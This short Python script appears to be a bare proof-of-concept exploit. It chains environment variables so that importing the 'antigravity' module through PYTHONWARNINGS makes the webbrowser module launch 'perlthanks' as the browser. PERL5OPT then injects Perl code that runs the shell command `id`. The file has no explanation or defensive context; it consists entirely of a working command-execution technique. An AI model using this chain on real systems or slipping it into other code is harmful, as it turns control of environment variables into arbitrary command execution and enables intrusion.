import webbrowser, os

os.environ['BROWSER'] = 'perlthanks'
os.environ['PERL5OPT'] = '-Mbase;print(`id`);exit;'
os.environ['PYTHONWARNINGS'] = 'all:0:antigravity.x:0:0'
# import warnings
# import antigravity

